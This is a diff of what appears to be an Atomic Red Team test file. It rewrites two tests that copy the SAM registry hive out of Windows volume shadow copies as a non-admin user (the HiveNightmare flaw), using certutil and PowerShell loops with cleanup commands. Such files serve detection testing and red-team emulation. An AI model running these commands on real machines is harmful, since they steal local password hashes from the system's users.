@@ -105,70 +105,55 @@ atomic_tests:
 - name: dump volume shadow copy hives with certutil
   auto_generated_guid: eeb9751a-d598-42d3-b11c-c122d9c3f6c7
   description: |
-    Dump hives from volume shadow copies with the certutil utility, exploiting a vulnerability known as "HiveNightmare" or "SeriousSAM".
-    This can be done with a non-admin user account. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)
+    Dump hives from volume shadow copies with the certutil utility
+    This can be done with a non-admin user account
   supported_platforms:
   - windows
   input_arguments:
-    dump_path:
-      description: Path where the hive will be dumped
-      type: Path
-      default: $ENV:temp
     target_hive:
       description: Hive you wish to dump
       type: String
       default: SAM
-    dumped_hive:
-      description: Name of the dumped hive
-      type: String
-      default: myhive
+    limit:
+      description: Limit to the number of shadow copies to iterate through when trying to copy the hive
+      type: Integer
+      default: 10
   executor:
     command: |
-      write-host ""
-      $shadowlist = get-wmiobject win32_shadowcopy
-      $volumenumbers = foreach($shadowcopy in $shadowlist){$shadowcopy.DeviceObject[-1]}
-      $maxvolume = ($volumenumbers | Sort-Object -Descending)[0]
-      $shadowpath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $maxvolume + "\Windows\System32\config\#{target_hive}"
-      certutil -f -v -encodehex $shadowpath #{dump_path}\#{dumped_hive} 2
-    name: powershell
+      for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\#{target_hive}" %temp%\#{target_hive}vss%a 2 >nul 2>&1) && dir /B %temp%\#{target_hive}vss%a
+    name: command_prompt
     elevation_required: false 
     cleanup_command: |
-      $toremove = #{dump_path} + "\" + '#{dumped_hive}'
-      rm $toremove -ErrorAction Ignore
+      for /L %a in (1,1,#{limit}) do @(del %temp%\#{target_hive}vss%a >nul 2>&1)
 
 - name: dump volume shadow copy hives with System.IO.File
   auto_generated_guid: 9d77fed7-05f8-476e-a81b-8ff0472c64d0
   description: |
-    Dump hives from volume shadow copies with System.IO.File. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)
+    Dump hives from volume shadow copies with System.IO.File
   supported_platforms:
   - windows
   input_arguments:
-    dump_path:
-      description: Path where the hive will be dumped
-      type: Path
-      default: $ENV:temp
     target_hive:
       description: Hive you wish to dump
       type: String
       default: SAM
-    dumped_hive:
-      description: Name of the dumped hive
-      type: String
-      default: myhive
+    limit:
+      description: Limit to the number of shadow copies to iterate through when trying to copy the hive
+      type: Integer
+      default: 10
   executor:
     command: |
-      write-host ""
-      $shadowlist = get-wmiobject win32_shadowcopy
-      $volumenumbers = foreach($shadowcopy in $shadowlist){$shadowcopy.DeviceObject[-1]}
-      $maxvolume = ($volumenumbers | Sort-Object -Descending)[0]
-      $shadowpath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $maxvolume + "\Windows\System32\config\#{target_hive}"
-      $mydump = #{dump_path} + '\' + '#{dumped_hive}'
-      [System.IO.File]::Copy($shadowpath , $mydump)
+      1..#{limit} | % { 
+       try { [System.IO.File]::Copy("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\#{target_hive}" , "$env:TEMP\#{target_hive}vss$_", "true") } catch {}
+       ls "$env:TEMP\#{target_hive}vss$_" -ErrorAction Ignore
+      }
     name: powershell
     elevation_required: false 
     cleanup_command: |
-      $toremove = #{dump_path} + "\" + '#{dumped_hive}'
-      rm $toremove -ErrorAction Ignore
+      1..#{limit} | % {
+        rm "$env:TEMP\#{target_hive}vss$_" -ErrorAction Ignore
+      }
+      
 - name: WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes
   auto_generated_guid: 0c0f5f06-166a-4f4d-bb4a-719df9a01dbb
   description: Loot local Credentials - Dump SAM-File for NTLM Hashes technique via function of WinPwn
